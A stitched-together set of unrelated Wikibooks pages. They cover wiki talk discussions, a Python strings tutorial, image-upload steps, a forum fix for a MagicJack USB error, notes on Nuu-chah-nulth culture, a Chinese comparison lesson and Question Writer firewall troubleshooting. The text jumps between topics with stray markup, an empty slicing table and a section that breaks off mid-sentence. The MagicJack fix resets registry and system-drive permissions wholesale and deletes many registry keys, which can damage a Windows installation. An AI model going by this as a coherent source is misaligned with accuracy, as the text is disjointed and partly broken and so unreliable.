I noticed you moved a recipe to a sentence-case name.  Looking through the recipes in the cookbook, I see a lot with title-case names and few with sentence-case names.  While books are consistently made with title-case names, I see that [[Cookbook:Policy#Naming_Conventions]] states that recipes should be title-case as well.  If you have a strong objection to this it may be beneficial to see how others feel on the talk page for that policy or in the reading room, otherwise you and other contributors to the cookbook will be working against each other. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 16:13, 17 November 2009 (UTC)
:I'm a little confused. Are you saying it's Wikibook policy to capitalize each noun in the name of the recipe page? [[User:Moby-Dick4000|Moby-Dick4000]] ([[User talk:Moby-Dick4000|talk]]) 18:39, 17 November 2009 (UTC)
::It sure looks to be the case from the [[Cookbook:Policy]] page.  It does say that the convention is &quot;de-facto&quot; so that may mean that there wasn't a formal process in deciding this.  I would think it came about to match the name casing of the textbooks in the main namespace but this was before my time here. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 18:50, 17 November 2009 (UTC)
:::Yes I just read the policy. You seem to be right. I'll start using title case from now on. When I have the time, I'll remove the redirects I did that changed the recipe title casing. However, I have noticed many recipes that use sentence casing as I did, so this policy is not very well known among the contributors.

Ciao Moby. I am en experienced user of Wikipedia (see [[:wikipedia:user:Attilios]]), especially devoting to Italian stuff. I've surfed here at [[Spaghetti alla puttanesca]] and just made some corrections at the page here. Can you approved them (or let me know your opinion)? Thanks and good work. --[[User:Attilios|Attilios]] ([[User talk:Attilios|talk]]) 08:08, 12 July 2010 (UTC)
:I've already done the review and also change the water quantity reference as it was superfluous and wasteful.   --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 08:28, 12 July 2010 (UTC)

      <text xml:space="preserve">&lt;!-- things to talk about: chr ord float int len repr s+b s[i] s[i:j] s*n find rfind replace strip --&gt;
&lt;!-- Start with indexing, user chr and ord to show how to do manual int&lt;-&gt;string --&gt;
&lt;!-- Repeate the &lt;B&gt; with slices and do actual html --&gt;
&lt;!-- Do some more phrasing --&gt;
&lt;!----&gt;
&lt;!-- Okay here is todays typing exercise: --&gt;
&lt;!-- &lt;source lang=&quot;python&quot;&gt; --&gt;
&lt;!-- def to_string(in_int): --&gt;
&lt;!--     &quot;Converts an integer to a string&quot; --&gt;
&lt;!--     out_str = &quot;&quot; --&gt;
&lt;!--     prefix = &quot;&quot; --&gt;
&lt;!--     if in_int &lt; 0: --&gt;
&lt;!--         prefix = &quot;-&quot; --&gt;
&lt;!--         in_int = -in_int         --&gt;
&lt;!--     while in_int / 10 != 0: --&gt;
&lt;!--         out_str = chr(ord('0')+in_int % 10) + out_str --&gt;
&lt;!--         in_int = in_int / 10 --&gt;
&lt;!--     out_str = chr(ord('0')+in_int % 10) + out_str --&gt;
&lt;!--     return prefix + out_str --&gt;
&lt;!--  --&gt;
&lt;!-- def to_int(in_str): --&gt;
&lt;!--     &quot;Converts a string to an integer&quot; --&gt;
&lt;!--     out_num = 0 --&gt;
&lt;!--     if in_str[0] == &quot;-&quot;: --&gt;
&lt;!--         multiplier = -1 --&gt;
&lt;!--         in_str = in_str[1:] --&gt;
&lt;!--     else: --&gt;
&lt;!--         multiplier = 1 --&gt;
&lt;!--     for x in range(0,len(in_str)): --&gt;
&lt;!--         out_num = out_num * 10 + ord(in_str[x]) - ord('0') --&gt;
&lt;!--     return out_num * multiplier --&gt;
&lt;!--  --&gt;
&lt;!-- print to_string(2) --&gt;
&lt;!-- print to_string(23445) --&gt;
&lt;!-- print to_string(-23445) --&gt;
&lt;!-- print to_int(&quot;14234&quot;) --&gt;
&lt;!-- print to_int(&quot;12345&quot;) --&gt;
&lt;!-- print to_int(&quot;-3512&quot;) --&gt;
&lt;!-- &lt;/source&gt; --&gt;
&lt;!-- The output is: --&gt;
&lt;!-- &lt;source lang=&quot;python&quot;&gt; --&gt;
&lt;!-- 2 --&gt;
&lt;!-- 23445 --&gt;
&lt;!-- -23445 --&gt;
&lt;!-- 14234 --&gt;
&lt;!-- 12345 --&gt;
&lt;!-- -3512 --&gt;
&lt;!-- &lt;/source&gt; --&gt;
&lt;!--  --&gt;
&lt;!-- So how does it work?  The first detail to notice is that it defines two different functions, one that converts a string to a number and one that converts a number to a string.  Notice that this function does string manipulation similar to how lists can be manipulated.  For example the line &lt;code&gt;if in_str[0] == &quot;-&quot;&lt;/code&gt; uses indexing to look at the first letter in the string.  Another thing that strings can do that lists can is using slices.  The line &lt;code&gt;in_str = in_str[1:]&lt;/code&gt; uses slices to get all but the first character of in_str (or drops the first letter).  However you cannot use slices or indexing to assign to a letter or location in a string. --&gt;
&lt;!--  --&gt;
&lt;!-- Two new things to introduced are the functions &lt;code&gt;ord&lt;/code&gt; and &lt;code&gt;chr&lt;/code&gt;.  The  --&gt;
&lt;!-- &lt;code&gt;ord&lt;/code&gt; function takes a character (a string of length one) and returns the ASCII value of the character.  The function &lt;code&gt;chr&lt;/code&gt; is its inverse and takes a ASCII value and returns a character.  The expression &lt;code&gt;ord(in_str[x]) - ord('0')&lt;/code&gt; uses the &lt;code&gt;ord&lt;/code&gt; function to find the value of a string.  This works since '0' through '9' have ASCII values that are all in a row.  The ASCII value of '0' is 48 and the ASCII value of '9' is 57 so when we subtract 57-48 we get 9 and this works similarly with other numbers.  The expression &lt;code&gt;chr(ord('0')+in_int % 10)&lt;/code&gt; works in a similar manor but in reverse.
--&gt;
And now presenting a cool trick that can be done with strings:
&lt;source lang=&quot;python&quot;&gt;
def shout(string):
    for character in string:
        print(&quot;Gimme a &quot; + character)
        print(&quot;'&quot; + character + &quot;'&quot;)

shout(&quot;Lose&quot;)

def middle(string):
    print(&quot;The middle character is:&quot;, string[len(string) // 2])

middle(&quot;abcdefg&quot;)
middle(&quot;The Python Programming Language&quot;)
middle(&quot;Atlanta&quot;)
&lt;/source&gt;

And the output is:

 Gimme a L
 'L'
 Gimme a o
 'o'
 Gimme a s
 's'
 Gimme a e
 'e'
 The middle character is: d
 The middle character is: r
 The middle character is: a

What these programs demonstrate is that strings are similar to lists in several ways.  The &lt;code&gt;shout()&lt;/code&gt; function shows that &lt;code&gt;for&lt;/code&gt; loops can be used with strings just as they can be used with lists.  The &lt;code&gt;middle&lt;/code&gt; procedure shows that that strings can also use the &lt;code&gt;len()&lt;/code&gt; function and array indexes and slices.  Most list features work on strings as well.

The next feature demonstrates some string specific features:
&lt;source lang=&quot;python&quot;&gt;
def to_upper(string):
    ## Converts a string to upper case
    upper_case = &quot;&quot;
    for character in string:
        if 'a' &lt;= character &lt;= 'z':
            location = ord(character) - ord('a')
            new_ascii = location + ord('A')
            character = chr(new_ascii)
        upper_case = upper_case + character
    return upper_case

print(to_upper(&quot;This is Text&quot;))
&lt;/source&gt;

with the output being:

 THIS IS TEXT

This works because the computer represents the characters of a string as numbers from 0 to 1,114,111.  For example 'A' is 65, 'B' is 66 and א is 1488. The values are the [[w:en:unicode|unicode]] value.  Python has a function called &lt;code&gt;ord()&lt;/code&gt; (short for ordinal) that returns a character as a number.  There is also a corresponding function called &lt;code&gt;chr()&lt;/code&gt; that converts a number into a character.  With this in mind the program should start to be clear.  The first detail is the line: &lt;code&gt;if 'a' &lt;= character &lt;= 'z':&lt;/code&gt; which checks to see if a letter is lower case.  If it is then the next lines are used.  First it is converted into a location so that a&amp;nbsp;=&amp;nbsp;0, b&amp;nbsp;=&amp;nbsp;1, c&amp;nbsp;=&amp;nbsp;2 and so on with the line: &lt;code&gt;location = ord(character) - ord('a')&lt;/code&gt;.  Next the new value is found with &lt;code&gt;new_ascii = location + ord('A')&lt;/code&gt;.  This value is converted back to a character that is now upper case.  Note that if you really need the upper case of a letter, you should use &lt;code&gt;u=var.upper()&lt;/code&gt; which will work with other languages as well.  

Now for some interactive typing exercise:

 &gt;&gt;&gt; '''# Integer to String'''
 &gt;&gt;&gt; '''2'''
 2
 &gt;&gt;&gt; '''repr(2)'''
 '2'
 &gt;&gt;&gt; '''-123'''
 -123
 &gt;&gt;&gt; '''repr(-123)'''
 '-123'
 &gt;&gt;&gt; '''# String to Integer'''
 &gt;&gt;&gt; '''&quot;23&quot;'''
 '23'
 &gt;&gt;&gt; '''int(&quot;23&quot;)'''
 23
 &gt;&gt;&gt; '''&quot;23&quot; * 2'''
 '2323'
 &gt;&gt;&gt; '''int(&quot;23&quot;) * 2'''
 46
 &gt;&gt;&gt; '''# Float to String'''
 &gt;&gt;&gt; '''1.23'''
 1.23
 &gt;&gt;&gt; '''repr(1.23)'''
 '1.23'
 &gt;&gt;&gt; '''# Float to Integer'''
 &gt;&gt;&gt; '''1.23'''
 1.23
 &gt;&gt;&gt; '''int(1.23)'''
 1
 &gt;&gt;&gt; '''int(-1.23)'''
 -1
 &gt;&gt;&gt; '''# String to Float'''
 &gt;&gt;&gt; '''float(&quot;1.23&quot;)'''
 1.23
 &gt;&gt;&gt; '''&quot;1.23&quot;''' 
 '1.23'
 &gt;&gt;&gt; '''float(&quot;123&quot;)'''
 123.0

If you haven't guessed already the function &lt;code&gt;repr()&lt;/code&gt; can convert an integer to a string and the function &lt;code&gt;int()&lt;/code&gt; can convert a string to an integer. The function &lt;code&gt;float()&lt;/code&gt; can convert a string to a float.  The &lt;code&gt;repr()&lt;/code&gt; function returns a printable representation of something. Here are some examples of this:

 &gt;&gt;&gt; '''repr(1)'''
 '1'
 &gt;&gt;&gt; '''repr(234.14)'''
 '234.14'
 &gt;&gt;&gt; '''repr([4, 42, 10])'''
 '[4, 42, 10]'

The &lt;code&gt;int()&lt;/code&gt; function tries to convert a string (or a float) into an integer.  There is also a similar function called &lt;code&gt;float()&lt;/code&gt; that will convert a integer or a string into a float.  Another function that Python has is the &lt;code&gt;eval()&lt;/code&gt; function.  The &lt;code&gt;eval()&lt;/code&gt; function takes a string and returns data of the type that python thinks it found.  For example:

 &gt;&gt;&gt; '''v = eval('123')'''
 &gt;&gt;&gt; '''print(v, type(v))'''
 123 &lt;type 'int'&gt;
 &gt;&gt;&gt; '''v = eval('645.123')'''
 &gt;&gt;&gt; '''print(v, type(v))'''
 645.123 &lt;type 'float'&gt;
 &gt;&gt;&gt; '''v = eval('[1, 2, 3]')'''
 &gt;&gt;&gt; '''print(v, type(v))'''
 [1, 2, 3] &lt;type 'list'&gt;

If you use the &lt;code&gt;eval()&lt;/code&gt; function you should check that it returns the type that you expect.

One useful string function is the &lt;code&gt;split()&lt;/code&gt; method. Here's an example:

 &gt;&gt;&gt; '''&quot;This is a bunch of words&quot;.split()'''
 ['This', 'is', 'a', 'bunch', 'of', 'words']
 &gt;&gt;&gt; '''text = &quot;First batch, second batch, third, fourth&quot;'''
 &gt;&gt;&gt; '''text.split(&quot;,&quot;)'''
 ['First batch', ' second batch', ' third', ' fourth']

Notice how &lt;code&gt;split()&lt;/code&gt; converts a string into a list of strings.  The string is split by whitespace by default or by the optional argument (in this case a comma).
You can also add another argument that tells &lt;code&gt;split()&lt;/code&gt; how many times the separator will be used to split the text. For example:

 &gt;&gt;&gt; '''list = text.split(&quot;,&quot;)'''
 &gt;&gt;&gt; '''len(list)'''
 4
 &gt;&gt;&gt; '''list[-1]'''
 ' fourth'
 &gt;&gt;&gt; '''list = text.split(&quot;,&quot;, 2)'''
 &gt;&gt;&gt; '''len(list)'''
 3
 &gt;&gt;&gt; '''list[-1]'''
 ' third, fourth'

&lt;!-- TODO add more on strings --&gt;
=== Slicing strings (and lists) ===

Strings can be cut into pieces &amp;mdash; in the same way as it was shown for lists in the previous chapter &amp;mdash; by using the ''slicing'' &quot;operator&quot; &lt;tt&gt;[]&lt;/tt&gt;. The slicing operator works in the same way as before: text[first_index:last_index] (in very rare cases there can be another colon and a third argument, as in the example shown below).

In order not to get confused by the index numbers, it is easiest to see them as ''clipping places'', possibilities to cut a string into parts. Here is an example, which shows the clipping places (in yellow) and their index numbers (red and blue) for a simple text string:

&lt;tt&gt;

|}
&lt;/tt&gt;

Note that the red indexes are counted from the beginning of the string and the blue ones from the end of the string backwards. (Note that there is no blue -0, which could seem to be logical at the end of the string. Because &lt;tt&gt;-0 == 0&lt;/tt&gt;, -0 means &quot;beginning of the string&quot; as well.)  Now we are ready to use the indexes for slicing operations:

&lt;tt&gt;
{|
|-
|text[1:4] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;TRI&quot;
|-
|text[:5] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;STRIN&quot;
|-
|text[:-1] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;STRIN&quot;
|-
|text[-4:] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;RING&quot;
|-
|text[2] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;R&quot;
|-
|text[:] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;STRING&quot;
|-
|text[::-1] || style=&quot;width:3em;text-align:center&quot; | &amp;rarr; || &quot;GNIRTS&quot;
|}
&lt;/tt&gt;

&lt;tt&gt;text[1:4]&lt;/tt&gt; gives us all of the &lt;tt&gt;text&lt;/tt&gt; string between clipping places 1 and 4, &quot;&lt;tt&gt;TRI&lt;/tt&gt;&quot;. If you omit one of the [first_index:last_index] arguments, you get the beginning or end of the string as default: &lt;tt&gt;text[:5]&lt;/tt&gt; gives &quot;&lt;tt&gt;STRIN&lt;/tt&gt;&quot;. For both &lt;tt&gt;first_index&lt;/tt&gt; and &lt;tt&gt;last_index&lt;/tt&gt; we can use both the red and the blue numbering schema: &lt;tt&gt;text[:-1]&lt;/tt&gt; gives the same as &lt;tt&gt;text[:5]&lt;/tt&gt;, because the index -1 is at the same place as 5 in this case. If we do not use an argument containing a colon, the number is treated in a different way: &lt;tt&gt;text[2]&lt;/tt&gt; gives us one character following the second clipping point, &quot;&lt;tt&gt;R&lt;/tt&gt;&quot;. The special slicing operation &lt;tt&gt;text[:]&lt;/tt&gt; means &quot;from the beginning to the end&quot; and produces a copy of the entire string (or list, as shown in the previous chapter).

Last but not least, the slicing operation can have a second colon and a third argument, which is interpreted as the &quot;step size&quot;: &lt;tt&gt;text[::-1]&lt;/tt&gt; is &lt;tt&gt;text&lt;/tt&gt; from beginning to the end, with a step size of -1. -1 means &quot;every character, but in the other direction&quot;. &quot;&lt;tt&gt;STRING&lt;/tt&gt;&quot; backwards is &quot;&lt;tt&gt;GNIRTS&lt;/tt&gt;&quot; (test a step length of 2, if you have not got the point here).

All these slicing operations work with lists as well. In that sense strings are just a special case of lists, where the list elements are single characters. Just remember the concept of ''clipping places'', and the indexes for slicing things will get a lot less confusing.

=== Examples ===
&lt;source lang=&quot;python&quot;&gt;
# This program requires an excellent understanding of decimal numbers.
def to_string(in_int):
    &quot;&quot;&quot;Converts an integer to a string&quot;&quot;&quot;
    out_str = &quot;&quot;
    prefix = &quot;&quot;
    if in_int &lt; 0:
        prefix = &quot;-&quot;
        in_int = -in_int
    while in_int // 10 != 0:
        out_str = str(in_int % 10) + out_str
        in_int = in_int // 10
    out_str = str(in_int % 10) + out_str
    return prefix + out_str

def to_int(in_str):
    &quot;&quot;&quot;Converts a string to an integer&quot;&quot;&quot;
    out_num = 0
    if in_str[0] == &quot;-&quot;:
        multiplier = -1
        in_str = in_str[1:]
    else:
        multiplier = 1
    for c in in_str:
        out_num = out_num * 10 + int(c)
    return out_num * multiplier

print(to_string(2))
print(to_string(23445))
print(to_string(-23445))
print(to_int(&quot;14234&quot;))
print(to_int(&quot;12345&quot;))
print(to_int(&quot;-3512&quot;))
&lt;/source&gt;

The output is:

 2
 23445
 -23445
 14234
 12345
 -3512

== merge ==

I suggest merging the entire [[C &amp; C++ X]] book into the [[C++ Programming/Examples]] section of this C++ Programming book.
Both seem to have the same target audience and the same subject -- people who are learning C++ and want to see examples of C++ source code.
--[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 21:06, 8 July 2010 (UTC)

:The value is debatable most of the examples seem to already be present and other will not be only a direct move of the content, the present examples here are used in the book (aren't isolated), merging would require searching for proper places for inclusion. An alternative would be in the [[C++ Programming/Exercises|exercises]].  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 21:29, 8 July 2010 (UTC)

::There doesn't seem to be much of value in the book [[C &amp; C++ X]], and nobody seems to want to substantially extend it. I can see in principle the value in having two books, one a didactic style and the other a &quot;cookbook&quot; or &quot;learn by example&quot; book, but it would be far better to have one good book than two half-completed ones. If the content in [[C &amp; C++ X]] is duplicated in [[C++ Programming]] then I think the former should be deleted to keep the place tidy. --[[User:Fishpi|Fishpi]] ([[User talk:Fishpi|talk]]) 17:16, 24 July 2010 (UTC)

:::Agree. I will try to find a solution to this, the last 2 examples can probably be inserted somewhere. But it will not be a &quot;real&quot; merge since 75% will be deleted.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 19:49, 24 July 2010 (UTC)</text>

      <text xml:space="preserve">Hallo Tictoon,

you have written that you don't know how to add images to the wikibook, so if you like, I will give you a short tutorial about that.

Just answer to this comment, I have your page in my watchlist now and will see if you write something. 
--[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 09:03, 23 March 2009 (UTC)


Hi SoylentGreen,

Yeah, I'm pretty new at this wiki stuff so I dont get a lot of things, I spent a few minutes trying to figure out how to answer your comment! A quick tutorial on uploading images would be very appreciated, and sorry for my late reply, I had become VERY preoccupied, and well you know how life can throw you curve-balls sometimes...

Redards,
Tictoon

== How to upload images ==
* Every image has to be uploaded to commons.wikimedia.org. Don't upload images to en.wikibooks.org, or the image can't be reused (i.e. in other languages).
* Every image has to get a meaningful name, many images are named &quot;Blender3D_DescribingNameOfTheImage-VersionNumber.FileType&quot;, e.g. &quot;Blender3D_RenderPanel-2.49.png&quot;. This is a useful scheme. 
* Use PNG files for screenshots, jpgs for images.

# Read the page [[Blender 3D: Noob to Pro/Using proper copyright RE:Blender]]. Copy one of the example templates to your HD and fill in the necessary information. Save this file for reuse.
# Open the page [http://commons.wikimedia.org/w/index.php?title=Special:Upload&amp;uploadformstyle=basic]
# Select your image file.
# Copy and paste the filled in template in the Summary field.
# Upload the file. 

That should be it. Now you can include the image file like every other image from commons. 

If you have more questions, please don't hesitate to ask. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 15:18, 18 May 2009 (UTC)</text>

I suggest merging [[Help:Manual of Style]] into [[Wikibooks:Local manuals of style]].
Both of them are discussing the same thing -- tips on writing a local manual of style.
(As opposed to, say, [[Wikibooks:Manual of Style]], which is a manual of style for all Wikibooks).

Just want to point out one small erro in that text book writing.  It is  in Lesson One.

Here is the original:

&quot;Simplified Characters   Traditional Characters 
东尼: 艾美，早上好。  東尼: 艾美，早安。&quot;

if you are going to use &quot;早上好&quot; then in Traditional part should be consistantly using  &quot;早上好&quot; but not &quot;zao an 早安&quot;.

'''For Vista:'''
(from a magicJack unofficial support forum entry)
http://www.phoneservicesupport.com/post35183.html#35183


After nearly a year of successfully using my MJ on my Vista Business laptop, I suddenly started getting the &quot;Warning: You must plug MagicJack into USB&quot; error. After spending nearly 2 hours on chat with the MJ &quot;techs,&quot; it became clear that they didn't have a clue as to the cause of the problem, though a quick Google search reveals that (1) it's endemic, and (2) it started around January or February. After tech support literally blew me off (&quot;Okay, I've adjusted your settings here. Reboot and it will work.&quot;, &quot;How can anything you do on your end affect this problem? Are you blowing me off?&quot;, &quot;Oh, no, I assure you it will work.&quot; It didn't work.), I spent another 6 hours on my own searching this site and the rest of the internet. I've been able to fix the problem but it took a combination of actions to do it -- no single fix took care of the problem -- so I thought I'd share them here.

First, a quick kluge to get around the problem:

After the &quot;Warning&quot; message opens up and the MJ opens a browser to the MJ site, open Computer, right click on the icon that says MagicJack or Phone, but not the one that says CD MagicJack and select &quot;Start MagicJack.&quot; The MJ will start right up and work fine. This is not a fix, however, as you will have to repeat the process each time you plug in the MJ.


Now, the fix:

0. THIS IS THE PROCEDURE FOR VISTA, ONLY. If you're running XP, you'll have to try something else. Because this procedure involves registry edits, I strongly recommend that, before beginning, you set a restore point and back up the registry.

Delete MagicJack from the computer

1. Manually delete the MagicJack folder under Program Files.

2. Manually delete the MJUSB folder, which is found here:

c:\users\[username]\appdata\roaming\mjusb

Reset the Registry permission

3. Download subinacl.exe from Microsoft here:

http://www.microsoft.com/downloads/details.aspx?familyid=e8ba3e56-d8fe-4a91-93cf-ed6985e3927b&amp;displaylang=en

Run the downloaded executable and let it install.

4. Open a text editor (Microsoft Notepad works fine) and enter the following (you can cut and past from this post):

cd /d &quot;%ProgramFiles%\Windows Resource Kits\Tools&quot;

subinacl /subkeyreg HKEY_LOCAL_MACHINE /grant=administrators=f /grant=system=f

subinacl /subkeyreg HKEY_CURRENT_USER /grant=administrators=f /grant=system=f

subinacl /subkeyreg HKEY_CLASSES_ROOT /grant=administrators=f /grant=system=f

subinacl /subdirectories %SystemDrive% /grant=administrators=f /grant=system=f

subinacl /subdirectories %windir%\*.* /grant=administrators=f /grant=system=f

secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose

You can also find the text here:

http://blog.tiensivu.com/aaron/archives/1412-Having-trouble-installing-the-Vista-SP1-update-Reset-your-registry-permissions!.html

Save the text file to the root directory (C:\) as RESET.CMD

Open Explorer and double click on RESET.CMD

This will reset all registry permissions and is a necessary step. This takes a long time -- go have dinner, take in a movie, or go out for a walk . . . or . . . go to step 4. You can do it while reset.cmd is running, but a lot of computer resources are used, so you might want to wait.

Format the MagicJack

4. Open Computer. Right click on MagicJack or Phone. Select Format. A window will open for formatting. Use the defaults and format the MJ.

Scrub out MagicJack keys from the Registry

5. In the Start Menu, click &quot;Run&quot; and type Regedit in the box. Hit return. This opens the Registry Editor.

6. Press CTL-F. This opens the search box. Type: magicjack and press Enter.

The software will find the first key containing magicjack. Delete it by right-clicking on the key in the left-hand window and selecting delete. The software will ask you to confirm the deletion. Select Yes.

7. Press F3 -- this will cause the software to search for the next instance of &quot;magicjack.&quot; Delete the key as described above. Keep pressing F3 and deleting found keys until you've worked your way through the registry. Note: there are LOTS of keys that must be deleted. Don't be surprised if there are 30, 40 or even 50 keys that must be deleted.

8. Use the slider to reposition the left-hand window on the very top entry and click it. Now open the following section:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR\

Find every instance of Disk&amp;Ven_YMAXxxxxxxxxxxxxxxx (the section identified by &quot;xxxxxxxx&quot; will vary from installation to installation).

Delete them. If the Registry won't allow you to delete them, you may need to change Ownership by right clicking on the key, selecting Permissions, Advanced and checking &quot;Full Control.&quot; You can find instructions on Google for doing this if you're having trouble.

9. Exit the Registry Editor and reboot.

Re-install the MagicJack

10. After your computer reboots, plug in the MagicJack. Vista will treat it as a new device and install it automatically.

11. After it has installed it will re-start. Either it will work or you'll get the &quot;Warning: You must plug MagicJack into USB&quot; error again. If you get the error, manually start the MagicJack by following the kluge procedure at the beginning of this post.

12. Once the MagicJack is up and running, click on Menu, Advanced, Run MagicFix. This will take you to the MJ website where you can click on Upgrade. Let the upgrade run -- you'll get the &quot;Lucky you -- you're getting an upgrade&quot; splash screen.

13. Once it has finished, leaving the MagicJack in place, reboot the computer.

That's it. The MagicJack should work normally and you shouldn't see the Warning: You must plug MagicJack into USB error again . . . at least until the next upgrade of MagicJack.

      <text xml:space="preserve">The name, Nu-Shah-Knuth, means: “All along the mountains and sea”
          

== Tribes ==


When Captain Cook first met these people, he referred to them as the Nootka, a mistaken name that has stuck with them for years. He grouped a bunch of tribes together all under the Nootka, yet they were different people. They all spoke the Wakashan Language with different variations from their own culture. (See language) Today, each Nuu-chah-nulth First Nation includes several chiefly families, and most include what were once considered several separate local groups.

 

Fourteen Nuu-chah-nulth First Nations are divided into three regions:

Sothern Region:Ditidaht, Huu-ay-aht, Hupacasath, Tse-shaht, and Uchucklesaht                                                                         

Central Region:Ahousaht, Hesquiaht, Tla-o-qui-aht, Toquaht, and Ucluelet

Northern Region:Ehattesaht, Kyuquot/Cheklesahht, Mowachat/Muchalaht, and Nuchatlaht



== Homes ==

Long houses at the water's edge.
Nuu-Chah-Nulth houses could be as long as 30 metres and were built with cedar beams and hand-split boards according to the same principles as Coast Salish houses. An example Nuu-Chah-Nulth house belonged to the head chief of the Tsesha'ath people who live near the present-day town of Port Alberni, at the head of Barkley Sound. The house stood in the 1800s. Although Nuu-Chah-Nulth houses were often set broadside to the beach, this house faced the beach. Below its large round doorway are ten round holes, representing ten moons. Above the entrance, two Thunderbirds face each other, and above each Thunderbird is the figure of a Lightning Snake, the supernatural servant of the Thunderbird. Above the Lightning Snake are two supernatural Codfish, facing each other.


== Language ==


Wakashan is one of the eleven native language families in Canada. The Wakashan language family is one of the six found in British Columbia alone. Wakashan has two main branches, Kwakiutl and Nuu-chah-nulth. Nuu-chah-nulth itself is divided into three languages. The northern and central Nuu-chah-nulth groups speak dialects of one language, while the southern group (Ditidaht and Makah) speak separate but closely related languages.




== Social Organization ==
  

The social organization of the Nuu chah nulth people was based on a stratified local group or lineage. The chief was at the top and his oldest son was to inherit everything, including becoming the title. The chief title was hereditary, and only men could be chiefs. Primogeniture. That's what it was. The Chief's younger sons and their families made the middle class and the other families were the commoners. They also kept slaves. No slave or commoner could ever become a chief.
Families were grouped and within those families, there was a recognized head of the family. Families were very important. Also, there was status within the families.

 

== Leadership and Government ==


The house chief, as the central authority figure, had charge of resources within his territory, and was entitled to receive a share of everything harvested in them. Although he was powerful, maintaining his high standing was heavily dependent on the support the chief and his family obtained in the community. The chief had to provide adequate protection for his people, and if he did not, they could leave him for a better chief. Also, since he would get a share of everyone's crops and gatherings, he could live well and have big potlatches (parties). Protection and these parties appealed to the people the most.  The relationship between a chief and his group can thus be referred to as a total social relationship: the chief relies on the members of his group to harvest the resources within his territory, and they rely upon him for his ability to provide them with ritual and economic security.



== Religion ==
 

Although whaling was more of a hunting ritual than a religion, it was part of their religion nevertheless. The whale harpooner was a person of high rank, and families passed down the magical and practical secrets that made for successful hunting. There was also a whale ritualist using ceremonial procedures, caused whales that had died of natural causes to drift ashore. Many features of this whaling complex suggest ancient ties with Eskimo and Aleut cultures. Their religion centred on shamanism and animism. The most important Nuu-chah-nulth ceremony was the shamans’ dance, a re-enactment of the kidnapping of an ancestor by supernatural beings who later gave him supernatural gifts and released him. The ceremony served to define each individual’s place in the social order. The public performance ended with a potlatch.

With the principle of &quot;hish-shuk-ish-tsawak&quot; which means &quot;All things are one or everything is connected&quot;, everything was important. Singing and dancing was part of their way of life. Story telling was important and community and family gatherings were important. Feasts and Potlatches were important.



== Dress ==


Both genders wore cedar-bark or fur robes pinned together at the right side, and women had in addition bark aprons extending from the waist to the knees.

 

== Food ==


The bulk of their food came from the sea: clams and urchins collected near the shorelines; salmon caught from the canoes as well as in and around spawning streams in fall; halibut fished in deep water far offshore; and sea mammals such as whales, seals and porpoises, all hunted from the canoes.



== Transportation ==


Dugout canoes, sturdy and heavy because they went hunting and traveling on the sea, where the waves were much bigger than in rivers and lakes. Also, they had to be strong enough to take some of the weight of whales, because they drag the whale back, tied to a team of canoes, to the village after hunting.



== Keeping track of time ==


They actually had names for each month of the year. The moon, especially was useful in keeping track of the time of year. Obviously, the four seasons also had names. For example, summer was &quot;tluu-piich&quot;. Knowing the four seasons served to keep one aware of one's age. Also, a coming of age for a female was very important and was marked by teachings for women delivered prior to a ceremony which marks one's coming of age (ready for womanhood). There was also a coming of age for manhood.



== Jobs ==


Prior to contact, the communities were fully self-contained, which means that most tribes wanted for almost nothing. If there was a need, then trade was conducted with tribes who were better able to provide. Each member of the tribe were trained to perform their specified tasks. In some cases, special training took place for river keepers and for speakers, as an example.



== Death ceremonies ==


In the old days, very little ceremony was conducted, when someone passed away, except for Ha'wiih (hereditary chiefs) or people of stature.

      <text xml:space="preserve">==Simple comparisons==

The primary word used for a comparison of two things (bigger, older, etc.) is 比 (''bǐ''). A simple comparison is constructed as '''X 比 Y SV'''.
:他比小明高。
:''Ta bi Xiao Ming gao.''
:He is taller than Xiao Ming.
Taken literally, this means that he, when compared with Xiao Ming, is tall.

==Negative comparisons==

A simple comparison can be negated by prepending 不 to 比:
:他不比小明高。
:''Ta bu bi Xiao Ming gao.''
:He is not taller than Xiao Ming.

[[Image:QW3 Tracker error.jpg|center]]


This error message indicates that Question Writer is having difficulty connecting to the internet. This can be for a number of different reasons.

===Internet Connection===

First of all you should check that you can access other websites on your computer, if you can then your internet connection is okay.

===Firewall===

It might also be that your firewall or security software is preventing access to the internet from Question Writer. This is likely to be the problem even if you can connect to the Question Writer Forum.  The forum link launches your browser, but the quiz upload accesses the internet directly from within the software.

Try disabling the firewall temporarily to see if that helps (and confirm if that is causing the problem) but remember to enable it again as it is not a good idea to keep your firewall switched off. 

Usually an alert will be displayed (from your firewall) asking you if you want to let the software (Question Writer) connect to the internet - you've got to tell it 'Yes'. If it doesn't ask, it might have an exception list where you can add Question Writer to the list of exceptions.  The steps to follow will depend on the firewall you're using - but if you've got Vista or XP, you can access the built in firewall at 

Start-&gt;Control Panel-&gt;Security Center-&gt;Windows Firewall-&gt;Allow a Program Through Windows Firewall-&gt;Add Program-&gt;Browse 

and Choose, 

C:\Program Files\Question Writer 4\QuestionWriter.exe 

Your firewall might also be on your router or corporate network in which case you may have less control over it.  You should speak to your systems administrator for help in resolving the problem.   

===Proxy Settings===

If your computer is on a network that uses a proxy to connect to the internet and you're using .NET 1.1, this can cause difficulties for Question Writer. If you think this might be the problem there are two ways to resolve the problem.

